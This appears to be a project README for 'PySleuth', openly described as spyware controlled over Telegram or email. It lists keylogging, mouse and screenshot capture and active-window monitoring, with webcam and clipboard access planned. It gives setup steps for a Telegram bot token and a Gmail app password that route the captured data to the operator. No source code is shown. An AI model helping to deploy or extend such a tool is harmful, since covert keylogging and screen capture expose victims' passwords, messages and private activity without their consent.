# PySleuth

PySleuth is an advanced spyware controllable by email/telegram.

## Features

- Keylogging

- Mouse activity (pixel coordinates of presses and release with screenshots)

- Process in the active window

- Screenshots every x seconds

### Upcoming

- Clipboard data

- Webcam access

## Requirements

### Linux

python >= 3.6

```bash
pip install -r requirements.txt
sudo apt install xdotool
```

### Windows

Coming soon !

## Usage

### Telegram Control

- Clone repository

- Make telegram bot using telegram's Bot Father

- Configure environment variables

```bash
export TELEGRAM_TOKEN="your token here"
export TELEGRAM_ID="administrator's chat ID here"
```

- Edit [settings.yml](settings.yml) according to preference

- Run

```bash
python main.py
```

### Email control

- Clone repository

- Make an email for the program and setup password for the application

  - From the Google account to send mail from, go to the [security section](https://myaccount.google.com/security)

  - Navigate to the `2-Step Verification` section and make sure it is turned ON

  - Go to the [App passwords section](https://myaccount.google.com/apppasswords)

  - Select app as `Mail` and choose your device and click on `GENERATE`. Note down the password provided

- Configure environment variables

```bash
export PYSLEUTH_EMAIL_PWD="your password here"
```

- Edit [settings.yml](settings.yml) according to preference

- Run

```bash
python main.py
```
